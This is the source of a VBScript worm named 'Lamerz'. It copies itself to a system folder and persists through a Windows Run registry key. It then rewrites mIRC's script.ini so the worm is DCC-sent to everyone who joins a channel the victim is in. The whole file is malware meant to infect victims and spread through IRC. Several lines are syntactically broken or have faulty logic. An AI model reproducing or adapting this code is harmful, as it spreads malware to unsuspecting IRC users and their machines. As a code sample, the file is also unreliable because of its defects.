'Lamerz Created By Pingu2000
On Error Resume Next
Set ltjmwavliji = CreateObject("WScript.Shell")
Set orpvdeppugw= Createobject("scripting.filesystemobject")
if not(orpvdeppugw.fileexists "c:\programs") then
orpvdeppugw.createfolder "c:\programs"
orpvdeppugw.copyfile wscript.scriptfullname,"c:\programs\Lamerz.vbs"
ltjmwavliji.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lamerz","wscript.exe c:\programs\Lamerz.vbs %"
if ltjmwavliji.regread ("HKCU\software\Lamerz\mirqued") <> "1" then
kdzdsfygijf()
end if
Function kdzdsfygijf(sgwolgqlhot)
On Error Resume Next
if sgwolgqlhot<>"" then
if orpvdeppugw.fileexists("c:\mirc\mirc.ini") then sgwolgqlhot="c:\mirc"
if orpvdeppugw.fileexists("c:\mirc32\mirc.ini") then sgwolgqlhot="c:\mirc32"
kkexkvcjaib=ltjmwavliji.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if orpvdeppugw.fileexists(kkexkvcjaib & "\mirc.ini") then sgwolgqlhot=kkexkvcjaib & "\mirc"
end if
if sgwolgqlhot <> "" then
set dqkjgpozkwz = orpvdeppugw.CreateTextFile(sgwolgqlhot & "\script.ini", True)
dqkjgpozkwz.WriteLine "[script]"
dqkjgpozkwz.writeline "n0=on 1:JOIN:#:{"
dqkjgpozkwz.writeline "n1=  /if ( $nick == $me ) { halt }"
ltjmwavliji.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Lamerz","wscript.exe c:\programs\Lamerz.vbs %"
dqkjgpozkwz.writeline "n2=  /.dcc send $nick "&c:\programs\Lamerz.vbs"
dqkjgpozkwz.writeline "n3=}"
dqkjgpozkwz.close
ltjmwavliji.regwrite "HKCU\software\Lamerz\Mirqued", "1"
end if
end function
